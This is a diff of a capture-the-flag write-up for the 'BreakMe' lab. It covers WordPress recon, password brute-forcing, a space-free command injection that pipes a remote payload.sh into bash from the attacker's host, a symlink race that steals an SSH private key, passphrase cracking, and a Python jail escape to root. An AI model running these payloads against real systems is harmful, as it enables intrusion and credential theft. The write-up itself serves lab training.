@@ -1,11 +1,30 @@
 # Web Hacking Phases
  
 Break this secure system and get the flags, if you can.
+### Front-End Recon
+
+
+
+
+### Fingerprinting Web Servers
+### Inspecting HTTP Response Headers and Sitemaps
+
+
+
+### Debugging Page Content
+### Technology Stack Identification
+### Directory and File Listings
+
+## Vulnerability Analysis
+### Security Testing
+### Enumerating APIs
+### Vulnerability Identification
+
 
 ## Reconnaissance
 ![cap1](cap1.png)
 
-### Service mapping 
+### Mapping and Discovery
 ```bash
 > nmap breakme.thm
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 12:53 EDT
@@ -52,7 +71,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
 ```
-### Adding to localhost 
+### Adding Localhost
 ```bash
 ~/breakme > echo "10.201.100.79 breakme.thm" | sudo tee -a /etc/hosts
 ```
@@ -67,8 +86,8 @@ PING breakme.thm (10.201.100.79) 56(84) bytes of data.
 2 packets transmitted, 2 received, 0% packet loss, time 1002ms
 rtt min/avg/max/mdev = 347.077/347.670/348.264/0.593 ms
 ```
-### Front-End Recon
-### Web Application Enumeration
+ 
+## Web Application Enumeration
 ### Fingerprinting Web Servers
 ```bash
 > curl -I 10.201.100.79
@@ -82,124 +101,10 @@ Content-Length: 10701
 Vary: Accept-Encoding
 Content-Type: text/html
 ```
-### Inspecting HTTP Response Headers and Sitemaps
 
-## Mapping and Discovery
-```bash
-
-```
 ![wordpress](wordpress_stack.png)
 
-
-### Debugging Page Content
-### Technology Stack Identification
 ### Directory and File Listings
-
-## Vulnerability Analysis
-### WPSCAN
-```bash
-> wpscan --url http://breakme.thm/wordpress
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.28
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[+] URL: http://breakme.thm/wordpress/ [10.201.100.79]
-[+] Started: Sat Aug 16 13:17:14 2025
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entry: Server: Apache/2.4.56 (Debian)
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: http://breakme.thm/wordpress/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
- | Found By: Rss Generator (Passive Detection)
- |  - http://breakme.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
- |  - http://breakme.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
-
-[+] WordPress theme in use: twentytwentyfour
- | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
- | Last Updated: 2024-11-13T00:00:00.000Z
- | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
- | [!] The version is out of date, the latest version is 1.3
- | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
- | Style Name: Twenty Twenty-Four
- | Style URI: https://wordpress.org/themes/twentytwentyfour/
- | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
- | Author: the WordPress team
- | Author URI: https://wordpress.org
- |
- | Found By: Urls In Homepage (Passive Detection)
- |
- | Version: 1.0 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
-
-[+] Enumerating All Plugins (via Passive Methods)
-[+] Checking Plugin Versions (via Passive and Aggressive Methods)
-
-[i] Plugin(s) Identified:
-
-[+] wp-data-access
- | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
- | Last Updated: 2025-07-25T00:01:00.000Z
- | [!] The version is out of date, the latest version is 5.5.45
- |
- | Found By: Urls In Homepage (Passive Detection)
- |
- | Version: 5.3.5 (80% confidence)
- | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:11 <================================> (137 / 137) 100.00% Time: 00:00:11
-
-[i] No Config Backups Found.
-
-[!] No WPScan API Token given, as a result vulnerability data has not been out  put.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Sat Aug 16 13:17:47 2025
-[+] Requests Done: 171
-[+] Cached Requests: 5
-[+] Data Sent: 45.727 KB
-[+] Data Received: 303.059 KB
-[+] Memory used: 266.129 MB
-[+] Elapsed time: 00:00:32
-```
-### README file
 ```bash
 > feroxbuster -u http://breakme.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings
                                                                                                                           
@@ -332,8 +237,112 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 ```
 
-### Security Testing
+## Security Testing
 ![admin](admin-login.png)
+
+### WPSCAN
+```bash
+> wpscan --url http://breakme.thm/wordpress
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://breakme.thm/wordpress/ [10.201.100.79]
+[+] Started: Sat Aug 16 13:17:14 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.56 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://breakme.thm/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://breakme.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
+ |  - http://breakme.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
+
+[+] WordPress theme in use: twentytwentyfour
+ | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
+ | Last Updated: 2024-11-13T00:00:00.000Z
+ | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
+ | [!] The version is out of date, the latest version is 1.3
+ | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
+ | Style Name: Twenty Twenty-Four
+ | Style URI: https://wordpress.org/themes/twentytwentyfour/
+ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] wp-data-access
+ | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
+ | Last Updated: 2025-07-25T00:01:00.000Z
+ | [!] The version is out of date, the latest version is 5.5.45
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 5.3.5 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:11 <================================> (137 / 137) 100.00% Time: 00:00:11
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been out  put.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Aug 16 13:17:47 2025
+[+] Requests Done: 171
+[+] Cached Requests: 5
+[+] Data Sent: 45.727 KB
+[+] Data Received: 303.059 KB
+[+] Memory used: 266.129 MB
+[+] Elapsed time: 00:00:32
+```
 
 ### Bruteforcing password (hydra http-post) 
 > user admin
@@ -343,7 +352,7 @@ curl -s -X POST http://breakme.thm/wordpress/wp-login.php \
   -d "log=admin&pwd=wrongpassword&wp-submit=Log+In" | grep -i error
 
 ```
-### Grab usernames
+### Grab usernames using cewl
 ```bash
 cewl -d 2 http://breakme.thm/wordpress/ -w usernames.txt
 ```
@@ -351,12 +360,10 @@ cewl -d 2 http://breakme.thm/wordpress/ -w usernames.txt
 > hydra -l admin -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form \
 "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:login_error" -V -f >/dev/null
 ```
-
-#  Vulnerability Identification
 ###  Vulnerable to information disclosure (IDOR)
 ![user-admin](user-admin.png)
 
-### Bruteforcing password 
+### Bruteforcing password using WPSCAN
 ```bash
 > wpscan --url http://breakme.thm/wordpress -U admin,bob -P /usr/share/wordlists/rockyou.txt
 
@@ -535,7 +542,7 @@ Interesting Finding(s):
 [+] Memory used: 249.125 MB
 [+] Elapsed time: 00:00:30
 ```
-### Vulnerable plugin
+### Vulnerable wordpress plugin
 ```bash
 # default scanning 
 [+] wp-data-access
@@ -988,7 +995,9 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 ![tcpdmp](intercept.png)
 ## Command Injection (Bypass Without Space) 
+![char_bypass](char_bypass.png)
 - $IFS is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret $IFS as a space. $IFS does not directly work as a separator in commands like ls, wget; use ${IFS} instead.
+
 ### Lateral movement to john
 
 ```bash
@@ -1010,10 +1019,24 @@ john@Breakme:~/internal$
 ```
 ```bash
 # terminal 4
+# grabbing cookie
+> curl -s -i http://localhost:4444 | head
+HTTP/1.1 200 OK
+Host: localhost:4444
+Connection: close
+X-Powered-By: PHP/7.4.33
+Set-Cookie: PHPSESSID=vsil68fo8415u9udqf0d01k1fh; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+
+# payload
 curl -X POST http://localhost:4444 \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -H "Cookie: PHPSESSID=oksd2bsnsg8prgtn4gshjvp0q5" \
-  -d "cmd2=%7Ccurl%24%7BIFS%7Dhttp%3A%2F%2F10.23.93.75%3A8000%2Fpayload.sh%7Cbash"
+  -H "Cookie: PHPSESSID=fc3iljknnqdc879ablcn65mkfu" \
+  -d "cmd2=%7Ccurl%24%7BIFS%7Dhttp%3A%2F%2F10.23.93.75%3A8002%2Fpayload.sh%7Cbash"
+ 
 ```
 
 ### Lateral movement to youcef
@@ -1024,48 +1047,414 @@ readfile
 readfile.c
 john@Breakme:/home/youcef$ 
 ```
-### Flags 
-- flag 1
-    - 5c3ea0d31[redacted]13785b26677
+### Analyzing index.php (internal server port 9999)
+```php
+<?php
+                function isvalidip($ip){
+                        return filter_var($ip,FILTER_VALIDATE_IP) != false;
+                }
 
+                function run($command,$value){
+                        if($command=="cmd1"){
+                                if(isvalidip($value)&&!preg_match("/[^0-9.]/",$value)){
+                                        $output=shell_exec("ping -c 2 $value >/dev/null 2>&1 &");
+                                        echo htmlspecialchars($output);
+                                }else{
+                                        echo "Invalid IP address";
+                                }
+                        }
+                        else if($command=="cmd2"){
+                                $val=preg_replace("/[^a-zA-Z0-9\|\$\{\}\/\:.]/","",$value);
+                                $output=shell_exec("id $val >/dev/null 2>&1 &");
+                                if($output!=''&&$val!=''){
+                                        echo htmlspecialchars("User $val found");
+                                }else{
+                                        echo htmlspecialchars("User $val not found");
+                                }
+                        }
+                        else{
+                                if(!preg_match("/[^a-zA-Z]/",$value)){
+                                        $output=shell_exec("find /opt -name \"$value\" 2>/dev/null");
+                                        if($output != ''){
+                                                echo htmlspecialchars($output);
+                                        }else{
+                                                echo "File not found";
+                                        }
+                                }else{
+                                        echo "Invalid Filename";
+                                }
+                        }
+                }
+        ?>
+``` 
+`isvalidip($ip)`
+
+- This function checks whether the provided `$ip` is a valid IP address using `filter_var` with the `FILTER_VALIDATE_IP` flag.
+
+- Potential Risk: If `isvalidip()` fails, it returns false, preventing the next steps from executing. But if there’s a way to bypass this validation, the input could still be processed.
+
+`run($command, $value)`
+
+This is the main function, which handles three cases based on the $command parameter:
+
+1. Command cmd1:
+
+- Validates an IP (using isvalidip()), then runs ping on the IP.
+
+- The ping command runs asynchronously in the background (&), redirecting both standard output and standard error to /dev/null.
+
+- Security Implications:
+	- Command injection risk: Although $value is supposed to be an IP address, the validation `(isvalidip())` might be bypassed if the $value includes characters that are valid IP addresses but also allow for command injection (e.g., 1.2.3.4; ls or 1.2.3.4&&whoami).
+
+2. Command cmd2:
+
+- The $value is sanitized with a regular expression that removes characters that are not alphanumeric, pipe (|), dollar ($), curly braces ({}), slash (/), colon (:), or dot (.).
+
+- This value is passed to the id command to check if a user exists with the provided name.
+
+- Security Implications:
+	- Insecure shell execution: Even though the regex filters out certain characters, it doesn't prevent shell metacharacters `(like ;, &&, etc.)` that could still lead to **command injection**. For instance, if `$value` is `foo; ls,` it would break the intended functionality and execute ls instead.
+
+- If the input isn't properly sanitized (or if the regex isn't tight enough), an attacker might inject arbitrary commands into the shell.
+
+3. Else Block:
+
+- It checks whether the $value is alphanumeric (via `preg_match("/[^a-zA-Z]/", $value))`, and if so, runs the find command to search for a file in /opt.
+
+- Security Implications:
+
+	- Command injection: The find command can be tricked using the same attack techniques as before if the input isn't correctly sanitized (e.g., using find /opt -name "file; ls" or find /opt -name "file && whoami").
+
+- Also, the regex only allows alphabetic characters in $value, but doesn’t block potentially dangerous characters like semicolons or ampersands in certain circumstances.
+
+### Lateral movement to youcef
+```bash
+john@Breakme:/home/youcef$ ls -al
+total 52
+drwxr-x--- 4 youcef john    4096 Aug  3  2023 .
+drwxr-xr-x 5 root   root    4096 Feb  3  2024 ..
+lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
+-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
+drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .local
+-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
+-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
+-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
+drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
+john@Breakme:/home/youcef$ 
+```
+```bash
+john@Breakme:/home/youcef$ nc -nv 10.23.93.75 9000 < readfile 
+Connection to 10.23.93.75 9000 port [tcp/*] succeeded!
+```
+```bash
+john@Breakme:/home/youcef$ nc -nv 10.23.93.75 9000 < readfile.c 
+bash: readfile.c: Permission denied
+```
+## Reverse Engineering
+### Investigating ELF binary file 
+```bash
+> file readfile
+readfile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=57ad78eb097b50fdbceb76baa4d2c7fdf5fc2483, for GNU/Linux 3.2.0, not stripped
+~/breakme > 
+```
+![ghidra](ghidra.png)
+```bash
+> chmod +x readfile
+> ./readfile
+Usage: ./readfile <FILE>
+
+> strings readfile > readfile_strings.txt
+> cat readfile_strings.txt | wc -l
+99
+```
+## UID manipulation
+UID-based Access Control was being enforced inside the binary using getuid() == 1002
+```bash
+> touch testfile.txt && chmod 000 testfile.txt 
+
+```bash
+> sudo useradd -u 1002 user2
+> grep user2 /etc/passwd
+user2:x:1002:1002::/home/user2:/bin/sh
+> sudo passwd user2
+New password: 
+Retype new password: 
+passwd: password updated successfully
+> sudo su - user2
+$ ./readfile testfile.txt
+I guess you won!
+```
+```bash
+john@Breakme:/home/youcef$ ./readfile /home/john
+I guess you won!
+```
+```bash
+john@Breakme:/home/youcef$ ./readfile /home/youcef/.ssh
+Nice try!
+```
+### 🔁 TOCTOU attack (race condition)
+capture id_rsa
+```bash
+while true; do
+  ln -sf race.txt race
+  /home/youcef/readfile race &
+  sleep 0.0001  # <- Add this tiny delay
+  ln -sf /home/youcef/.ssh/id_rsa race
+done
+```
+#### output
+```bash
+john@Breakme:~$ ./rsa.sh
+
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try!
+Nice try
+```
+### Final payload
+flipping a file between a symlink and regular file.
+```bash
+#!/bin/bash
+
+# Start the race condition loop in the background
+while true; do
+  ln -sf /home/youcef/.ssh/id_rsa flip
+  rm flip
+  touch flip
+done &
+
+# Save the PID of the background process
+RACE_PID=$!
+
+# Run readfile 10 times
+for i in {1..10}; do
+  /home/youcef/./readfile flip
+done
+
+# Kill the background race loop after done
+kill $RACE_PID
+wait $RACE_PID 2>/dev/null
+```
+```bash
+john@Breakme:~$ ./rsa.sh
+File Not Found
+File Not Found
+File Not Found
+I guess you won!
+
+File Not Found
+File Not Found
+I guess you won!
+
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+I guess you won!
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
+Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
+P5f1aOa67ZDRv6XlKz/0fASHI4XQF3pNBWpA79PPlOxDP3QZfZnIxNIeqy8NXrT23cDQdx
+ZDWnKO1hlrRk1bIzQJnMSFKO9d/fcxJncGXnjgBTNq1nllLHEbf0YUZnUILVfMHszXQvfD
+j2GzYQbirrQ3KfZa+m5XyzgPCgIlOLMvTr2KnUDRvmiVK8C3M7PtEl5YoUkWAdzMvUENGb
+UOI9cwdg9n1CQ++g25DzhEbz8CHV/PiU+s+PFpM2chPvvkEbDRq4XgpjGJt2AgUE7iYp4x
+g3S3EnOoGoezcbTLRunFoF2LHuJXIO6ZDJ+bIugNvX+uDN60U88v1r/SrksdiYM6VEd4RM
+s2HNdkHfFy6o5QnbBYtcCFaIZVpBXqwkX6aLhLayteWblTr7KzXy2wdAlZR3tnvK/gXXg3
+...
+redacted
+...
+0lRm7uTl7DUQEVL9jE+pnoU7uROfN4PH6zkiG9xmmuoYYiPSe9JaVuqyJ93cXoXy5HiGaJ
+cMXgFzZBR+UdD3FKRvAdcswLkFscANEs6p6R4G6YtMbyylFe7uUb6DtevtBm8vBqBHftzp
+hdliLJt0xG6Cb/23Vkh9rG25475k7kk7rh1ZXDNXuU4Z1DvPgh269FyR2BMJ3UUj2+HQdc
+0LBpVwh96JbHrLASEwx74+CQq71ICdX3Qvv0cJFjMBUmLgFCyaoKlNKntBqHEJ2bI4+qHq
+W5lj7CKPS8r6xN83bz8pWg44bbJaspWajXqgDM0Pb4/ANBgMoxLgAmQUgSLfDOg6FCXGlU
+rkYkHSce+BnIEYBnNK9ttPGRMdElELGBTfBXpBtYoF+9hXOnTD2pVDVewpV7kOqBiusnfM
+yHBxN27qpNoUHbrKHxLx4/UN4z3xcaabtC7BelMsu4RQ3rzGtLS9fhT5e0hoMP+eU3IvMB
+g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
+TabCXd2Ji/Y7UvM=
+-----END OPENSSH PRIVATE KEY-----
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+File Not Found
+```
+### Hash cracking (john)
+```bash
+# checking file (passphrase or no-passphrase)
+> ssh-keygen -y -f id_rsa1
+Enter passphrase for "id_rsa1": 
+```
+```bash
+~/breakme > ssh2john id_rsa1 > id_rsa_hash.txt ;
+```
+```bash
+> john id_rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+a123456          (id_rsa1)     
+1g 0:00:01:01 DONE (2025-08-19 13:20) 0.01628g/s 10.94p/s 10.94c/s 10.94C/s sunshine1..kelly
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.    
+```
+```bash
+> ssh -i id_rsa1 youcef@10.201.124.183
+
+youcef@Breakme:~$ 
+youcef@Breakme:~$ sudo -l
+Matching Defaults entries for youcef on breakme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User youcef may run the following commands on breakme:
+    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
+youcef@Breakme:~$ 
+```
 
 
 ### Gaining Root 
 
-## Post-Exploitation
-### Flags
-### Covering Tracks 
+```bash
+youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> 
+```
+```bash
+youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> 
+>> 'hello'
+>> print('test')
+test
+>> __import__('o' + 's').system('id')
+Illegal Input
+```
 
-## Reporting
-### Summary
-# Web Hacking Phases
+𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() with italic Unicode characters instead of plain ASCII breakpoint().
+```bash
+youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> [c.__name__ for c in ().__class__.__bases__[0].__subclasses__()]
+>> print(dir(__builtins__))
+['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
+Illegal Input
+youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> subprocess = [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0]
+Illegal Input
+youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
+  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
+--Return--
+> <string>(1)<module>()->None
+(Pdb) import os;os.system("/bin/sh")
+# 
+```
+### Source code analysis
+```py
+import os
+
+def malicious():
+    print("Illegal Input")
+
+def main():
+        while(True):
+                try:
+                    text = input('>> ')
+                except:
+                    print("Exiting...")
+                    return
+                for keyword in ['#',' ','}','`','"','class','?','breakpoint','eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'lower','class','init','\\','+','‘','readlines','bash','sh','7z', 'aa-exec', 'ab', 'agetty', 'alpine', 'ansible-playbook', 'ansible-test', 'aoss', 'apt-get', 'apt', 'ar', 'aria2c', 'arj', 'arp', 'ascii-xfr', 'ascii85', 'ash', 'aspell', 'at', 'atobm', 'awk', 'aws', 'base32', 'base58', 'base64', 'basenc', 'basez', 'bash', 'batcat', 'bc', 'bconsole', 'bpftrace', 'bridge', 'bundle', 'bundler', 'busctl', 'busybox', 'byebug', 'bzip2', 'c89', 'c99', 'cabal', 'cancel', 'capsh', 'cat', 'cdist', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'choom', 'chown', 'chroot', 'cmp', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'debugfs', 'dialog', 'diff', 'dig', 'distcc', 'dmesg', 'dmidecode', 'dmsetup', 'dnf', 'docker', 'dos2unix', 'dosbox', 'dotnet', 'dpkg', 'dstat', 'dvips', 'easy_install', 'eb', 'ed', 'efax', 'elvish', 'emacs', 'env', 'eqn', 'espeak', 'exiftool', 'expand', 'expect', 'facter', 'find', 'finger', 'fish', 'flock', 'fmt', 'fping', 'ftp', 'gawk', 'gcc', 'gcloud', 'gcore', 'gdb', 'gem', 'genie', 'genisoimage', 'ghc', 'ghci', 'gimp', 'ginsh', 'git', 'grc', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'ispell', 'jjs', 'joe', 'join', 'journalctl', 'jq', 'jrunscript', 'jtag', 'julia', 'knife', 'ksh', 'ksshell', 'ksu', 'kubectl', 'latex', 'latexmk','ld.so', 'ldconfig', 'less', 'lftp', 'ln', 'loginctl', 'logsave', 'look', 'lp', 'ltrace', 'lua', 'lualatex', 'luatex', 